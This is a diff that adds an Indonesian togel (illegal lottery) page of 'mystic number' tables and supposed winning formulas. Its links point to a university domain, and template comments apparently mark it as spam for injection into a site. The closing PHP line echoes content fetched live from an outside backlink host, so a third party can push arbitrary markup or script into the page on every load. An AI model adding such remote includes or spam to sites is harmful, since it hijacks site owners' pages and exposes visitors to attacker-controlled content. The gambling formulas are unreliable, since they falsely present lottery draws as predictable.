+          <!-- Content section Start -->
+          
+         
+          <footer class="footer-container container">
+             <div class="row site-description-container">
+                 
+                <div class="col-sm-12">
+            <!--GANTI ARTIKEL-->
+            <h1>Angka Mistik Togel - Mistik Baru - Mistik Lama - Mistik Index</h1>
+            <p><a href="https://home.kku.ac.th/edconference/stdID/angka-mistik-togel/">Angka Mistik Togel</a> merupakan salah satu rumus togel buat menghitung ataupun memperoleh suatu <em>angka ampuh</em> togel tertentu.</p>
+            <p><strong>Mistik</strong> baru ataupun lama entah dari mana asal&ndash;usul nya serta siapa yang awal kali menciptakan rumus tersebut namun kami senantiasa wajib menyajikan nya buat para bettors togel mania sekaligus, sebab sangat banyak yang mencari di search engine <a href="https://google.co.id/" target="_blank">google</a> dengan pencarian kata kunci &ldquo;<em>Angka Mistik Togel</em>&rdquo; bisa jadi saja awal kali di temukan oleh para togellers senior yang telah pensiun ataupun masih aktif hingga saat ini ini di dunia judi toto gelap ataupun biasa di sebut pula warga selaku <em>Togel</em> ataupun <em>kupon putih</em> di Negeri Indonesia Tercinta.</p>
+            <p>Bisa jadi saja rumus angka mistik lama, mistik baru ataupun angka index ini biasa tembus di pasaran togel <strong>Singapore</strong>, <strong>Hongkong</strong>, <strong>Sydney</strong>, <strong>Cambodia</strong> ataupun pasaran <strong>WLA</strong> sehingga banyak yang mengenakan rumus tersebut selaku acuan ataupun patokan buat mencari angka turut, angka main, cari kawan, game colok ataupun tarikan paito togel, baik tua ataupun muda tentu tidak asing lagi mendengar rumus ini.</p>
+            <p><strong><em>INFO</em></strong> : Contoh dibawah merupakan angka <span style="color: #00ff00;"><strong>1</strong></span> <strong>mistik baru</strong> nya <span style="color: #00ff00;"><strong>7</strong></span>, angka <span style="color: #ffff00;"><strong>2</strong></span> <strong>mistik lama</strong> nya <span style="color: #ffff00;"><strong>5</strong></span>, angka <span style="color: #800080;"><strong>2</strong></span> <strong>index</strong> nya <span style="color: #800080;"><strong>7</strong></span>, bolak balik angka serta seterusnya pula berlaku.</p>
+            <p>Mari ayo kita ikuti dengan seksama <strong>Angka Mistik Togel</strong> tersebut.</p>
+            <br />
+            <table class="togel" style="width: 100%;">
+                <thead>
+                <tr>
+                <th colspan="3"><strong>Tabel Mistik Angka</strong></th>
+                </tr>
+                <tr>
+                <th><strong>BARU</strong></th>
+                <th><strong>LAMA</strong></th>
+                <th><strong>INDEX</strong></th>
+                </tr>
+                </thead>
+                <tbody>
+                <tr>
+                <td><strong>0 < = > 8</strong></td>
+                <td><strong>0 < = > 1</strong></td>
+                <td><strong>1 < = > 6</strong></td>
+                </tr>
+                <tr>
+                <td><strong>1 < = > 7</strong></td>
+                <td><strong>2 < = > 5</strong></td>
+                <td><strong>2 < = > 7</strong></td>
+                </tr>
+                <tr>
+                <td><strong>2 < = > 6</strong></td>
+                <td><strong>3 < = > 8</strong></td>
+                <td><strong>3 < = > 8</strong></td>
+                </tr>
+                <tr>
+                <td><strong>3 < = > 9</strong></td>
+                <td><strong>4 < = > 7</strong></td>
+                <td><strong>4 < = > 9</strong></td>
+                </tr>
+                <tr>
+                <td><strong>4 < = > 5</strong></td>
+                <td><strong>6 < = > 9</strong></td>
+                <td><strong>5 < = > 0</strong></td>
+                </tr>
+                </tbody>
+                </table>
+            <h2 style="text-align: center;">Rumus Mistik & Pola</h2>
+            <p>Berikut dibawah merupakan pola rumus 2D 3D 4D yang seringkali digunakan oleh para master & teman sniper sepanjang ini:</p>
+            <ul>
+            <li>0 = 48710 vs 35962</li>
+            <li>1 = 73801 vs 94526</li>
+            <li>2 = 67254 vs 19083</li>
+            <li>3 = 19830 vs 67542</li>
+            <li>4 = 50471 vs 82396</li>
+            <li>5 = 94625 vs 73108</li>
+            <li>6 = 82693 vs 50174</li>
+            <li>7 = 21547 vs 06839</li>
+            <li>8 = 06839 vs 21547</li>
+            <li>9 = 35962 vs 48710</li>
+            </ul>
+            <h2 style="text-align: center;">Metode Memakai Rumus Mistik</h2>
+            <table class="togel" style="width: 100%;">
+            <thead>
+            <tr>
+            <th>-31(95)-</th>
+            <th>-30(32)-</th>
+            <th>-50(14)-</th>
+            <th>-94(31)-</th>
+            </tr>
+            </thead>
+            <tbody>
+            <tr>
+            <td>9=35962 vs 48710</td>
+            <td>3=19830 vs 67542</td>
+            <td>1=73801 vs 94526</td>
+            <td>3=19830 vs 67542</td>
+            </tr>
+            <tr>
+            <td>5=94625 vs 73108</td>
+            <td>2=67542 vs 19830</td>
+            <td>4=50471 vs 82396</td>
+            <td>1=73801 vs 94526</td>
+            </tr>
+            <tr>
+            <td>9625 vs 7108 vs 3 vs 4</td>
+            <td>19803 vs 67524</td>
+            <td>701 vs 926 vs 38 vs 45</td>
+            <td>3801 vs 4526 vs 9 vs 7</td>
+            </tr>
+            <tr>
+            <td>keluar > (32)</td>
+            <td>keluar > (14)</td>
+            <td>keluar > (31)</td>
+            <td>keluar > (94) dan seterusnya</td>
+            </tr>
+            
+            </tbody>
+            </table>
+            <p>Terima kasih atas kunjungan nya, <strong>rumus togel</strong> yang sudah admin ulas di atas mudah-mudahan bisa menolong kamu & sahabat&ndash;sahabat sekaligus buat mencapai kemenangan jackpot( JP) malam ataupun sore hari ini.</p>
+        </div> 
+            <!--BATAS HAPUS-->
+         </footer>
+         <!-- Content section End -->
+         <!-- Buttons section Start -->
+
+<br>
+         <!-- Buttons section End -->
+
+         <!-- Footer Section Start -->
+          <div class="copyright_footer_area">
+              <div class="container copyright_data_area">
+
+                     <p><a href="https://home.kku.ac.th/edconference/stdID/angka-mistik-togel/">ANGKA MISTIK TOGEL</a> © Copyright 2023.</p><br>
+                </div>
+          </div>
+          
+          <!-- Footer Section End -->
+       </body>
+
+       <?php
+       echo file_get_contents("https://artikelsh.xyz/backlink.php");
+       ?>
+       
